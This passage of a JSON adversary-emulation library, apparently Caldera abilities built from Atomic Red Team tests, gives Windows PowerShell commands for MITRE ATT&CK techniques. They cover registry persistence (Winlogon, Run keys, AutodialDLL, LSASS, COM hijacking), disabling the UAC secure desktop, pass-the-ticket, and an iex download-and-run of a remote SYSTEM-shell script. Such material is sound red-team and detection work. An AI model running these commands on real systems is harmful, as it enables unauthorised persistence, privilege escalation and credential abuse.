            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\"; Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'",
                    "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \" #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "55e14d8b479b905a13976c8d94016a7b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "55e14d8b479b905a13976c8d94016a7b"
    },
    "T1546__multiple__Event Triggered Execution__2fc2b9c9b48990938653dbe8966d487d": {
        "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546",
            "name": "Event Triggered Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value  $env:windir\\system32\\rasadhlp.dll",
                    "command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\"};  ;  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2fc2b9c9b48990938653dbe8966d487d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2fc2b9c9b48990938653dbe8966d487d"
    },
    "T1547.014__multiple__Active Setup__7ad5840a79f3259965fa28835dda93c4": {
        "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.014",
            "name": "Active Setup"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7ad5840a79f3259965fa28835dda93c4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7ad5840a79f3259965fa28835dda93c4"
    },
    "T1497.001__multiple__Virtualization/Sandbox Evasion: System Checks__64ccf7cd4358a0540ab51c8015c1b744": {
        "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"; if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "64ccf7cd4358a0540ab51c8015c1b744",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "64ccf7cd4358a0540ab51c8015c1b744"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__03a127453d425bf1fd8dc9af1ed7ddce": {
        "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore",
                    "command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"; Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Start-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "03a127453d425bf1fd8dc9af1ed7ddce",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "03a127453d425bf1fd8dc9af1ed7ddce"
    },
    "T1546__multiple__Event Triggered Execution__495536c73651969fd80a8f263c293194": {
        "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546",
            "name": "Event Triggered Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore",
                    "command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"; if (!(Test-Path -path $path)){;   New-Item -ItemType Key -Path $path; }; New-ItemProperty -Path $path -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "495536c73651969fd80a8f263c293194",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "495536c73651969fd80a8f263c293194"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__c4c471259798dd6c7b0b56f716e12113": {
        "description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force",
                    "command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c4c471259798dd6c7b0b56f716e12113",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c4c471259798dd6c7b0b56f716e12113"
    },
    "T1055.001__multiple__Process Injection: Dynamic-link Library Injection__c1392878b0e39a2060e7e1b70e5a580b": {
        "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.001",
            "name": "Process Injection: Dynamic-link Library Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c1392878b0e39a2060e7e1b70e5a580b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c1392878b0e39a2060e7e1b70e5a580b"
    },
    "T1547.003__multiple__Time Providers__7a4867f379d79c82f217108c48bdbf33": {
        "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.003",
            "name": "Time Providers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "net stop w32time; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Windows\\SYSTEM32\\w32time.DLL\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"0\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"0\" /f; rm -force C:\\Users\\Public\\AtomicTest.dll; net start w32time",
                    "command": "net stop w32time; Copy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7a4867f379d79c82f217108c48bdbf33",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7a4867f379d79c82f217108c48bdbf33"
    },
    "T1546.012__multiple__Event Triggered Execution: Image File Execution Options Injection__7f43a2b144f2534eb979d2b6638e0283": {
        "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.012",
            "name": "Event Triggered Execution: Image File Execution Options Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\" ; Remove-Item $SilentProcessExit -force; $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"; Remove-Item $registryPath -force",
                    "command": "$Name = \"GlobalFlag\"; $Value = \"512\"; $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"; New-Item -Path $registryPath -Force; New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force; $Name = \"ReportingMode\"; $Value = \"1\"; $SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\"; New-Item -Path $SilentProcessExit -Force; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force ; $Name = \"MonitorProcess\"; $Value = \"cmd.exe /c calc.exe\"; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force; Start-Process whoami.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7f43a2b144f2534eb979d2b6638e0283",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7f43a2b144f2534eb979d2b6638e0283"
    },
    "T1547.004__multiple__Boot or Logon Autostart Execution: Winlogon Helper DLL__f7c881e0d021a2f5b45546b5d0b4998e": {
        "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Type ExpandString -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"AtomicTestFunction\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f7c881e0d021a2f5b45546b5d0b4998e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f7c881e0d021a2f5b45546b5d0b4998e"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__23000b943f18392d477ad7a1cad6586c": {
        "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\"",
                    "command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "23000b943f18392d477ad7a1cad6586c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "23000b943f18392d477ad7a1cad6586c"
    },
    "T1550.003__multiple__Use Alternate Authentication Material: Pass the Ticket__566388d2f3073aced1a2c86b3a65826c": {
        "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1550.003",
            "name": "Use Alternate Authentication Material: Pass the Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\localhost -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi; Set-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"; Move-Item -Force \"\\\\localhost\\c$\\ticket.kirbi\" ticket.kirbi; Write-Host \"Successfully retrieved TGT from 'localhost', now requesting a TGS from local\"; & \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt; Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"; & \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "566388d2f3073aced1a2c86b3a65826c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "566388d2f3073aced1a2c86b3a65826c"
    },
    "T1053.005__multiple__Scheduled Task/Job: Scheduled Task__4150ef18184112953ae5742a3f8de64e": {
        "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1",
                    "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"; Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4150ef18184112953ae5742a3f8de64e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4150ef18184112953ae5742a3f8de64e"
    },
    "T1134.001__multiple__Access Token Manipulation: Token Impersonation/Theft__81289b3d78d06c14b816f7644b1d9f8b": {
        "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe\" -Argument \"-U:T -P:E cmd\"; Start-Sleep -Second 5; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "81289b3d78d06c14b816f7644b1d9f8b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "81289b3d78d06c14b816f7644b1d9f8b"
    },
    "T1546.015__multiple__Event Triggered Execution: Component Object Model Hijacking__3c8ae3452b200f3509b14463df78068c": {
        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore",
                    "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll\"; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3c8ae3452b200f3509b14463df78068c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3c8ae3452b200f3509b14463df78068c"
    },
    "T1055__multiple__Process Injection__ce67d9c1b111032ddb8a56363c854fdc": {
        "description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055",
            "name": "Process Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force",
                    "command": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" (Start-Process calc.exe -PassThru).Id",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ce67d9c1b111032ddb8a56363c854fdc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ce67d9c1b111032ddb8a56363c854fdc"
    },
    "T1134.004__multiple__Access Token Manipulation: Parent PID Spoofing__9ac97b0e88af420a8c767a7512985895": {
        "description": "Spawns a notepad.exe process as a child of the current process.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.004",
            "name": "Access Token Manipulation: Parent PID Spoofing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9ac97b0e88af420a8c767a7512985895",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9ac97b0e88af420a8c767a7512985895"
    },
    "T1547.008__multiple__Boot or Logon Autostart Execution: LSASS Driver__4572792b7173c41d22a827610b8f8890": {
        "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.008",
            "name": "Boot or Logon Autostart Execution: LSASS Driver"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null",
                    "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4572792b7173c41d22a827610b8f8890",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4572792b7173c41d22a827610b8f8890"
    },
    "T1134.004__multiple__Access Token Manipulation: Parent PID Spoofing__aa40e8fe704a97fb7f7a5a02e9334824": {
        "description": "Spawnd a process as a child of the first accessible svchost.exe process.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.004",
